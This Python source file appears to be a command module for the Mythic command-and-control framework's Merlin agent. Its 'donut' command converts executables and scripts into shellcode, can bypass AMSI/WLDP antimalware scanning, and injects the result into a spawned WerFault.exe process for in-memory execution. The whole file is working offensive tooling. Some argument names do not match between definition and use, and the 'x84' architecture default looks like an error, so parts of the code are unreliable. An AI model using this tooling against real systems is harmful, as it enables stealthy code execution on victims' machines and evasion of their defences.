
from merlin import donut, MerlinJob, get_or_register_file
from mythic_payloadtype_container.MythicCommandBase import *
from mythic_payloadtype_container.MythicRPC import *
import json

# Set to enable debug output to Mythic
debug = False


class DonutArguments(TaskArguments):
    def __init__(self, command_line):
        super().__init__(command_line)
        self.args = {
            CommandParameter(
                name="module",
                type=ParameterType.String,
                description="Module name. Randomly generated by default with entropy enabled",
                parameter_group_info=[ParameterGroupInfo(
                    group_name="Default",
                    ui_position=0,
                    required=False,
                )],
            ),
            CommandParameter(
                name="url",
                type=ParameterType.String,
                description="HTTP server that will host the donut module",
                parameter_group_info=[ParameterGroupInfo(
                    group_name="Default",
                    ui_position=1,
                    required=False,
                )],
            ),
            CommandParameter(
                name="entropy",
                type=ParameterType.ChooseOne,
                choices=["1", "2", "3"],
                description="1=disable, 2=use random names, 3=random names + symmetric encryption (default)",
                default_value="3",
                parameter_group_info=[ParameterGroupInfo(
                    group_name="Default",
                    ui_position=2,
                    required=True,
                )],
            ),
            CommandParameter(
                name="arch",
                type=ParameterType.ChooseOne,
                description="Target Architecture: x32, x64, or x84",
                choices=["x84", "x32", "x64", ],
                default_value="x84",
                parameter_group_info=[ParameterGroupInfo(
                    group_name="Default",
                    ui_position=3,
                    required=False,
                )],
            ),
            CommandParameter(
                name="bypass",
                description="Bypass AMSI/WLDP : 1=skip, 2=abort on fail, 3=continue on fail",
                type=ParameterType.ChooseOne,
                choices=["3", "2", "1"],
                default_value="3",
                parameter_group_info=[ParameterGroupInfo(
                    group_name="Default",
                    ui_position=4,
                    required=False,
                )],
            ),
            CommandParameter(
                name="entrypoint",
                description="Create a new thread for loader. Optionally execute original entrypoint of host process",
                type=ParameterType.Boolean,
                value=False,
                default_value=False,
                parameter_group_info=[ParameterGroupInfo(
                    group_name="Default",
                    ui_position=5,
                    required=False,
                )],
            ),
            CommandParameter(
                name="exit",
                description="Exiting. 1=exit thread, 2=exit process",
                type=ParameterType.ChooseOne,
                choices=["2", "1"],
                parameter_group_info=[ParameterGroupInfo(
                    group_name="Default",
                    ui_position=6,
                    required=False,
                )],
            ),
            CommandParameter(
                name="class",
                description="Optional class name.  (required for .NET DLL)",
                type=ParameterType.String,
                parameter_group_info=[ParameterGroupInfo(
                    group_name="Default",
                    ui_position=7,
                    required=False,
                )],
            ),
            CommandParameter(
                name="domain",
                description="AppDomain name to create for .NET.  Randomly generated by default with entropy enabled",
                type=ParameterType.String,
                parameter_group_info=[ParameterGroupInfo(
                    group_name="Default",
                    ui_position=8,
                    required=False,
                )],
            ),
            CommandParameter(
                name="method",
                description="Optional method or API name for DLL. (a method is required for .NET DLL)",
                type=ParameterType.String,
                parameter_group_info=[ParameterGroupInfo(
                    group_name="Default",
                    ui_position=9,
                    required=False,
                )],
            ),
            CommandParameter(
                name="input",
                type=ParameterType.File,
                description=".NET assembly, EXE, DLL, VBS, JS or XSL file to execute in-memory",
                parameter_group_info=[ParameterGroupInfo(
                    group_name="Default",
                    ui_position=10,
                    required=True,
                )],
            ),
            CommandParameter(
                name="parameters",
                type=ParameterType.String,
                description="Optional parameters/command line inside quotations for DLL method/function or EXE.",
                parameter_group_info=[ParameterGroupInfo(
                    group_name="Default",
                    ui_position=11,
                    required=False,
                )],
            ),
            CommandParameter(
                name="unicode",
                type=ParameterType.Boolean,
                description="Command line is passed to unmanaged DLL function in UNICODE format. (default is ANSI)",
                value=False,
                default_value=False,
                parameter_group_info=[ParameterGroupInfo(
                    group_name="Default",
                    ui_position=12,
                    required=False,
                )],
            ),
            CommandParameter(
                name="runtime",
                type=ParameterType.String,
                description="CLR runtime version. This will override the auto-detected version",
                parameter_group_info=[ParameterGroupInfo(
                    group_name="Default",
                    ui_position=13,
                    required=False,
                )],
            ),
            CommandParameter(
                name="thread",
                description="Create new thread for entrypoint of unmanaged EXE",
                type=ParameterType.Boolean,
                value=False,
                default_value=False,
                parameter_group_info=[ParameterGroupInfo(
                    group_name="Default",
                    ui_position=14,
                    required=False,
                )],
            ),
            CommandParameter(
                name="compress",
                description="Pack/Compress file. 1=disable, 2=LZNT1, 3=Xpress, 4=Xpress Huffman",
                type=ParameterType.ChooseOne,
                choices=["1", "2", "3", "4"],
                parameter_group_info=[ParameterGroupInfo(
                    group_name="Default",
                    ui_position=15,
                    required=False,
                )],
            ),
            CommandParameter(
                name="spawnto",
                type=ParameterType.String,
                description="The child process to inject and execute the donut generated shellcode",
                default_value="C:\\Windows\\System32\\WerFault.exe",
                parameter_group_info=[ParameterGroupInfo(
                    group_name="Default",
                    ui_position=16,
                    required=True,
                )],
            ),
            CommandParameter(
                name="spawnto arguments",
                type=ParameterType.String,
                description="Arguments to create the spawnto process with, if any",
                parameter_group_info=[ParameterGroupInfo(
                    group_name="Default",
                    ui_position=17,
                    required=False,
                )],
            ),
            CommandParameter(
                name="verbose",
                description="Show verbose output from Donut",
                type=ParameterType.Boolean,
                parameter_group_info=[ParameterGroupInfo(
                    group_name="Default",
                    ui_position=18,
                    required=False,
                )],
            ),
        }

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == '{':
                self.load_args_from_json_string(self.command_line)
            else:
                pass


class DonutCommand(CommandBase):
    cmd = "donut"
    needs_admin = False
    help_cmd = "donut"
    description = "Convert a VBS/JS or PE/.NET EXE/DLL to shellcode.\n\t\tOnly the finest artisanal donuts are made" \
                  " of shells.\r\nUses the go-donut project at https://github.com/Binject/go-donut"
    version = 1
    author = "@Ne0nd0g"
    argument_class = DonutArguments
    attackmapping = ["T1055"]
    attributes = CommandAttributes(
        spawn_and_injectable=False,
        supported_os=[SupportedOS.Windows]
    )

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        task.display_params = f'{json.loads(task.original_params)["input"]} {task.args.get_arg("params")}\n ' \
                              f'SpawnTo: {task.args.get_arg("spawnto")} {task.args.get_arg("spawntoargs")}'

        if debug:
            await MythicRPC().execute("create_output", task_id=task.id, output=f'[DEBUG]Starting create_tasking()')

        donut_args = {
            "module": task.args.get_arg("module"),
            "url": task.args.get_arg("url"),
            "entropy": task.args.get_arg("entropy"),
            "arch": task.args.get_arg("arch"),
            "bypass": task.args.get_arg("bypass"),
            "oep": task.args.get_arg("entrypoint"),
            "exit": task.args.get_arg("exit"),
            "class": task.args.get_arg("class"),
            "domain": task.args.get_arg("domain"),
            "method": task.args.get_arg("method"),
            "params": task.args.get_arg("params"),
            "unicode": task.args.get_arg("unicode"),
            "runtime": task.args.get_arg("runtime"),
            "thread": task.args.get_arg("thread"),
            "compress": task.args.get_arg("compress"),
            "entrypoint": task.args.get_arg("entrypoint"),
            "verbose": task.args.get_arg("verbose")
        }

        input_bytes = await get_or_register_file(
            task,
            json.loads(task.original_params)["input"],
            task.args.get_arg("input")
        )

        if debug:
            await MythicRPC().execute("create_output", task_id=task.id, output=f'[DEBUG]Calling donut()')

        donut_results = donut(input_bytes, donut_args)

        if task.args.get_arg("verbose"):
            await MythicRPC().execute("create_output", task_id=task.id,
                                      output=f'[DONUT]Donut verbose output:\r\n{donut_results[1]}\r\n')

        task.stdout = f'[DONUT]Donut verbose output:\r\n{donut_results[1]}\r\n'

        # 1. Shellcode
        # 2. SpawnTo Executable
        # 3. SpawnTo Arguments (must include even if empty string)
        args = [donut_results[0], task.args.get_arg("spawnto"), task.args.get_arg("spawntoargs")]

        # Merlin jobs.Command message type
        command = {
            "command": "createprocess",
            "args": args,
        }

        task.args.add_arg("type", MerlinJob.MODULE, ParameterType.Number)
        task.args.add_arg("payload", json.dumps(command), ParameterType.String)
        task.args.remove_arg("input")
        task.args.remove_arg("spawnto")
        task.args.remove_arg("spawntoargs")
        for arg, value in donut_args.items():
            task.args.remove_arg(arg)

        if debug:
            await MythicRPC().execute("create_output", task_id=task.id, output=f'[DEBUG]Returned task:\r\n{task}\r\n')
        return task

    async def process_response(self, response: AgentResponse):
        pass
